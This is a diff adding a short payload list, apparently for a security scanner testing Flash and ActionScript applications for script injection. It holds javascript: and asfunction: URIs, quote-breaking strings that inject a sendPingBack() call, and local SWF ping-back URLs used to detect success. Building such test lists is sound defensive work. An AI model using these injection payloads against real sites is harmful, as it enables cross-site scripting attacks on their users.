@@ -1,0 +1,9 @@
+javascript:sendPingBack();
+sendPingBack
+\"+sendPingBack());}catch(e){sendPingBack();}//
+\"));sendPingBack();}catch(e){sendPingBack();}//
+asfunction:getURL,javascript:sendPingBack();
+http://127.0.0.1:9081/ExternalInterfacePing.swf
+http://127.0.0.1:9081/NavigateToURLPing.swf
+http://127.0.0.1:9081/GetURLPing.swf
+http://127.0.0.1:9081/FSCommandPing.swf
